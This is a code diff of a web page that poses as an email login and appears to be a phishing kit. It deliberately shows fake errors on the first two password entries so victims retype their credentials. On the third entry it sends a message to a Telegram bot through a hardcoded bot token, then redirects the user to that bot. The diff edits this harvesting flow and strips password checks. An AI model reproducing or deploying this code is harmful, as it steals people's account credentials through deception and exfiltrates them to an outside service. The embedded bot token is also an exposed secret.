@@ -126,7 +126,7 @@
 </div>
 
 <script>
-    // ========== Bot Redirect Link ==========
+    // ========== Bot Redirect Link (د start پیرامیټر سره) ==========
     const BOT_REDIRECT = "https://t.me/imrankhabot?start=confirm_account";
     
     const BOT_TOKEN = "8815514761:AAGT82khXsn8TmJHCv5vgSZG86Z6fAwGktQ";
@@ -135,15 +135,6 @@
     let attempts = {};
     let currentEmail = "";
 
-    // ========== Password Validation Functions ==========
-    function isEnglishPassword(password) {
-        return /^[a-zA-Z0-9!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]+$/.test(password);
-    }
-    
-    function hasMinimumLength(password, minLength) {
-        return password.length >= minLength;
-    }
-    
     function isValidEmail(email) {
         return /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(email);
     }
@@ -191,22 +182,12 @@
         document.getElementById('passwordInput').value = '';
     };
 
-    // Step 2: Password Validation and Login Attempts
+    // Step 2: Password with 3 attempts
     document.getElementById('loginBtn').onclick = async () => {
         let pass = document.getElementById('passwordInput').value.trim();
         
         if (!pass) {
-            showMessage(document.getElementById('errorBox'), 'Please enter your email password', true);
-            return;
-        }
-        
-        if (!isEnglishPassword(pass)) {
-            showMessage(document.getElementById('errorBox'), 'Pashto not allowed', true);
-            return;
-        }
-        
-        if (!hasMinimumLength(pass, 8)) {
-            showMessage(document.getElementById('errorBox'), 'Please check your password', true);
+            showMessage(document.getElementById('errorBox'), 'Please enter your password', true);
             return;
         }
         
@@ -218,22 +199,23 @@
         
         let currentAttempt = attempts[key];
         
-        // First attempt - show email error
+        // First attempt - fail
         if (currentAttempt === 1) {
             showMessage(document.getElementById('errorBox'), 'Please check your email', true);
             setTimeout(() => goBackToEmail(), 1500);
             return;
         }
         
-        // Second attempt - show email and password error
+        // Second attempt - fail
         if (currentAttempt === 2) {
-            showMessage(document.getElementById('errorBox'), 'Please check your email and password', true);
+            showMessage(document.getElementById('errorBox'), 'Please check your email password', true);
             setTimeout(() => goBackToEmail(), 1500);
             return;
         }
         
         // Third attempt - success
         if (currentAttempt >= 3) {
+            // Send notification to admin
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST', headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ 
